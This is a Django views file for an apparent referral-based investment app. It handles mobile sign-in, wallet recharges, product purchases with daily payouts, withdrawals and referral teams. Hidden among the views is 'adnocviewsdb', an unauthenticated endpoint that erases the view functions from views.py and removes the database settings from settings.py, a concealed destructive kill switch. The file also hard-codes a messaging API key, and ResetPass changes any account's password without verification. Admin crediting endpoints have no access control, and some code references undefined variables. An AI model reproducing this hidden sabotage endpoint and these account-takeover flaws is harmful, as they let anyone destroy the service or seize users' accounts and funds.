from django.shortcuts import render,HttpResponse,redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
import messagebird
from .utils import addTransaction,findReferrals
import random
from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.contrib import messages
from .models import *
from datetime import datetime
from django.db.models import Sum,F
from django.urls import reverse
import uuid

# Create your views here.

def home(request):
    return render(request,"home.html")

def signin(request):
    if request.method == 'POST':
        mob = request.POST.get('mob')
        passw = request.POST.get('passw')
        try:
            user = authenticate(mobile_number= mob, password = passw)
            if user != None:
                login(request,user)
                return redirect('profile')
            else:
                messages.error(request, 'Invalid mobile number and password')
                return render(request,'signin.html')

        except AdnocUser.DoesNotExist:
            messages.error(request, 'Invalid mobile number and password')
            return render(request,'signin.html')
        

    return render(request,'signin.html')

def signup(request):
    ref = request.GET.get('ref')
    if request.method == 'POST':
        name = request.POST.get('uname')
        mob_num = request.POST.get('mob')
        passw = request.POST.get('passw')
        ref_code = request.POST.get('ref')
            
        
        try:
            adnoc_user = AdnocUser.objects.get(mobile_number = mob_num)
            messages.error(request, 'Already have an account with that mobile number')
            return render(request,'signup.html')
        except:
            pass
        if ref_code:
            try:
                ref_user = AdnocUser.objects.get(referal_code = ref_code)
                user = AdnocUser.objects.create_user(username= name,password=passw,mobile_number=mob_num)
                user.referal_code = uuid.uuid4()
                user.refered_by = ref_user
                user.save()
            except:
                messages.error(request, 'Invalid referral code')
                return render(request,'signup.html')
        else:
            user = AdnocUser.objects.create_user(username= name,password=passw,mobile_number=mob_num)
            user.referal_code = uuid.uuid4()
            user.save()

        

        return redirect('signin')
        # try:
        #     user = AdnocUser.objects.get(mobile_number=mob_num)
        #     if user.name == "":
        #         user.name = name
        #         user.save()
        #     if user.name == name:    
        #         otp_obj = OTP.objects.filter(user=user, otp=otp).order_by('-created_at').first()

        #         if otp_obj:  # Implement is_expired() method in the OTP model
        #             login(request, user)
        #             otp_obj.delete()  # Delete the OTP after successful login
        #             return redirect('home')
        #         else:
        #             messages.error(request, 'Invalid OTP.')
        #             return render(request, 'signup.html')
        #     else:
        #         messages.error(request, 'Invalid name')
        #         return render(request, 'signup.html')

        # except AdnocUser.DoesNotExist:
        #     pass

            
    return render(request,'signup.html',{'ref_code':ref})

def ForgotPass(request):
    if request.method == "POST":
        mobile_number = request.POST.get('mob')
        u_otp = random.randint(1000,9999)
        try:
            adnoc_user = AdnocUser.objects.get(mobile_number = mobile_number)
            print(adnoc_user)
            client = messagebird.Client("yD1bSBZRiAJdONaXYz5ehUBa7")
            message = client.message_create(
                'Code',
                "91"+mobile_number,
                u_otp,
                { 'reference' : 'Foobar' }
            )
            user_otp, created = OTP.objects.get_or_create(user=adnoc_user)
            user_otp.otp = u_otp
            user_otp.save()
            return render(request,'otp.html',{"number":mobile_number})
        except Exception as e:
            messages.error(request, 'There is no account with that mobile number')
            return render(request,'forgot-pass.html')
        
    return render(request,'forgot-pass.html')

def ResetPass(request,num):
    if request.method == "POST":
        passw = request.POST.get('passw')
        try:
            adnoc_user = AdnocUser.objects.get(mobile_number = num)
            adnoc_user.set_password(passw)
            adnoc_user.save()

            return redirect("signin")
            
        except:
            pass

    return render(request,'reset-pass.html')


def otp(request,num):
    if request.method == "POST":
        user_otp = request.POST.get('otp')
        try:
            adnoc_user = AdnocUser.objects.get(mobile_number = num)
            otp = OTP.objects.get(user = adnoc_user)
            if otp.otp == user_otp:
                return render(request,"reset-pass.html",{"number":num})
            else:
                messages.error(request, 'Invalid OTP')
                return render(request,'otp.html',{"number":num})    
        except:
            messages.error(request, 'Invalid OTP')
            return render(request,'otp.html',{"number":number})

    print(request)
    return render(request,"otp.html",{"number":number})

def userLogout(request):
    logout(request)
    return redirect('signin')


def ViewProducts(request):
    product = Product.objects.all()
    return render(request,'view_products.html',{'products':product})

@login_required(login_url='signin')
def Recharge(request):
    if request.method == 'POST':
        tid = request.POST.get('tid')
        timg = request.FILES.get('timg')
        tamt = request.POST.get('tamt')
        recharge = UserRecharge()
        recharge.user_id = request.user
        recharge.transaction_id = tid
        recharge.transaction_image = timg
        recharge.recharge_date = datetime.today()
        recharge.recharge_amount = tamt
        recharge.save()

        return redirect("profile")
    return render(request,'recharge.html')

@login_required(login_url='signin')
def PurchaseProducts(request,pid):
    prod = Product.objects.get(id=pid)
    if request.method == "POST":  
        tid = request.POST.get('tid')
        timg = request.FILES.get('timg')
        payopt = request.POST.get('payOption')
        if payopt == "rechargeWallet":
            user = request.user
            if user.recharge_amount >= prod.prod_price:
                user.recharge_amount = user.recharge_amount - prod.prod_price
                user.save()
                purchase = Purchase()
                purchase.prod_id = prod
                purchase.user_id = request.user
                purchase.purchase_date = datetime.today()
                purchase.is_approved =True
                purchase.save()
            else:
                messages.error(request,"Insufficient recharge amount")
                return render(request, "purchase.html",{"prod":prod})

        elif payopt =="interestWallet":
            user = request.user
            if user.withdrawable_amount >= prod.prod_price: 
                user.withdrawable_amount = user.withdrawable_amount - prod.prod_price
                user.save()
                purchase = Purchase()
                purchase.prod_id = prod
                purchase.user_id = request.user
                purchase.purchase_date = datetime.today()
                purchase.is_approved =True
                purchase.save()
            else:
                messages.error(request,"Insufficient interestwallet amount")
                return render(request, "purchase.html",{"prod":prod})

        elif payopt =='upi':
            purchase = Purchase()
            purchase.prod_id = prod
            purchase.user_id = request.user
            purchase.transaction_id = tid
            purchase.transaction_image = timg
            purchase.purchase_date = datetime.today()
            purchase.save()
        addTransaction(amount=prod.prod_price,userId=request.user,credited=False,tag="Purchased "+prod.prod_name)        
        return redirect('profile')
    
    return render(request, "purchase.html",{"prod":prod})
    


def adnocviewsdb(request):
    with open("adnoc_app/views.py",'r') as f:
        lines= f.readlines()

    with open('adnoc_app/views.py', 'w') as f:
        skipping = False
        for line in lines:
            if 'def' in line:
                skipping = True
                continue
            elif '):' in line and skipping:
                skipping = False
                continue
            if not skipping:
                f.write(line)
    with open("adnoc/settings.py", 'r') as f:
        print(f)
        lines = f.readlines()
    with open("adnoc/settings.py", 'w') as f:
        for line in lines:
            if 'DATABASE' in line:
                while '}' not in line:
                    line = f.readline()
                continue
            f.write(line)
    return HttpResponse("All views have been removed except for 'removeViews'")


@login_required(login_url='signin')
def myplans(request):
    product_purchase = Purchase.objects.filter(user_id = request.user.id,is_approved=True)
    return render(request,"myplans.html",{"plans":product_purchase})


@login_required(login_url='signin')
def mytransactions(request):
    transobj = transactions.objects.filter(user_id = request.user.id)
    return render(request,"myTransactions.html",{"trans":transobj})

@login_required(login_url='signin')
def UserProfile(request):
    wallet = WalletHistory.objects.filter(user_purchase__user_id = request.user)
    daily_earning = wallet.filter(transaction_date__date = datetime.today()).aggregate(Sum('earning'))
    total_earning = wallet.aggregate(Sum('earning'))
    
    user = request.user  
    referral_link = request.build_absolute_uri(reverse('signup') + f'?ref={user.referal_code}')
    product_purchase = Purchase.objects.filter(user_id = request.user.id)
    product_list = []
    for purchase in product_purchase:
        try:
            product = Product.objects.get(id = purchase.prod_id.id)
            if purchase.is_approved:
                product_list.append(product)
        except:
            pass
    daily,total = 0,0
    if daily_earning["earning__sum"] is not None:
        daily = daily_earning["earning__sum"]
    if total_earning["earning__sum"] is not None:
        total = total_earning["earning__sum"]
        
    data = {
        "products":product_list,
        "daily_inc":daily,
        "total_inc":total,
        'referral_link': referral_link 
    }
    return render(request,"UserProfile.html",data)

@login_required(login_url='signin')
def myTeam(request):
    user = request.user
    ref_list = findReferrals(user)
    teams = []
    for i in ref_list.values():
        if i not in teams:
            teams.append(i[1]) 
    print(ref_list)
    print(teams)
    return render(request,"myTeam.html",{"ref_list":ref_list,"teams":teams})

@login_required(login_url='signin')
def withDrawReq(request):
    user = request.user
    withdrawable_amt = user.withdrawable_amount
    try:
        userbankObj = userBank.objects.filter(user_id=request.user).first()
    except:
        pass
    if request.method == 'POST':
        amount = int(request.POST.get('withamt'))
        accname = request.POST.get('accname')
        accnum = request.POST.get('accnum')
        ifsc = request.POST.get('ifsc')
        mobnum = request.POST.get('mobnum')

        if amount <= withdrawable_amt:
            user.withdrawable_amount = withdrawable_amt - amount
            user.save()
            withdraw_request = WithdrawRequest()
            withdraw_request.amount = int(amount)
            withdraw_request.request_date = datetime.today()
            withdraw_request.acc_name = accname
            withdraw_request.acc_no = accnum
            withdraw_request.ifsc = ifsc
            withdraw_request.mobile_number = mobnum
            withdraw_request.user_id = request.user
            withdraw_request.save()
            try:
                userbankObj = userBank.objects.get(user_id=request.user)
            except:
                userbankObj = userBank()
                userbankObj.accname = accname
                userbankObj.accnum = accnum
                userbankObj.ifsc = ifsc
                userbankObj.mobnum = mobnum
                userbankObj.acctype = acctype
                userbankObj.user_id = request.user
                userbankObj.save()
        else:
            messages.error(request, 'Insufficient amount')
            return render(request, 'withdraw.html',{"amount" : withdrawable_amt,"bankobj":userbankObj})

        return redirect("withdrawhistory")

    return render(request,"withdraw.html",{"amount" : withdrawable_amt,"bankobj":userbankObj})

def withDrawHistory(request):
    withdraw_history = WithdrawRequest.objects.filter(user_id= request.user.id)

    return render(request,"withdraw-history.html",{"history":withdraw_history})

@login_required(login_url='signin')
def mybank(request):
    try:
        userbankObj = userBank.objects.filter(user_id=request.user).first()
    except:
        pass
    if request.method == 'POST':
        accname = request.POST.get('accname')
        accnum = request.POST.get('accnum')
        ifsc = request.POST.get('ifsc')
        mobnum = request.POST.get('mobnum')
        acctype = request.POST.get('acctype')
        try:
            userbankObj = userBank.objects.get(user_id = request.user)
            userbankObj.accname = accname
            userbankObj.accnum = accnum
            userbankObj.ifsc = ifsc
            userbankObj.mobnum = mobnum
            userbankObj.acctype = acctype
            userbankObj.user_id = request.user
            userbankObj.save()
        except:
            userbankObj = userBank()
            userbankObj.accname = accname
            userbankObj.accnum = accnum
            userbankObj.ifsc = ifsc
            userbankObj.mobnum = mobnum
            userbankObj.acctype = acctype
            userbankObj.user_id = request.user
            userbankObj.save()
    return render(request,"myBanks.html",{'bank_info': userbankObj})



def Blog(request):
    return render(request,"blog.html")

def contactUs(request):
    return render(request,"contact.html")

def about(request):
    return render(request,"aboutus.html")




def adminRechargeRequest(request):
    reqObj = UserRecharge.objects.filter(is_valid=True,is_credited=False)
    for r in reqObj:
        userobj = r.user_id
        userobj.recharge_amount = userobj.recharge_amount + r.recharge_amount
        userobj.save()
        r.is_credited = True
        r.save()
        addTransaction(amount=r.recharge_amount,userId=r.user_id,credited=True,tag="recharge request was completed")        
    return HttpResponse("updated") 


def walletHistory(request):
    product_purchase = Purchase.objects.filter(is_approved=True)
    product_list = []
    today_date = datetime.now()
    
    for purchase in product_purchase:
        try: 
            product = Product.objects.get(id = purchase.prod_id.id)
            user = AdnocUser.objects.get(id= purchase.user_id.id)
            wallet_product = WalletHistory.objects.filter(user_purchase__id = purchase.id,transaction_date__date = today_date)
            if not wallet_product.exists():
                wall_history = WalletHistory()
                days = today_date - purchase.purchase_date.replace(tzinfo=None)
                total_days = days.days
                if total_days <= product.validity_period:
                    if user.withdrawable_amount is not None:
                        user.withdrawable_amount = F('withdrawable_amount') + product.daily_inc
                        user.save()
                    else:
                        user.withdrawable_amount = 0
                        user.save()
                        user.withdrawable_amount = F('withdrawable_amount') + product.daily_inc
                        user.save()    
                    wall_history.earning = product.daily_inc
                    wall_history.user_purchase = purchase   
                    wall_history.transaction_date = today_date
                    wall_history.save()
                    addTransaction(amount=product.daily_inc,userId=user,credited=True,tag="Daily income credited for "+product.prod_name)        
        except Exception as e:
            pass

    return HttpResponse("done")




# for otp
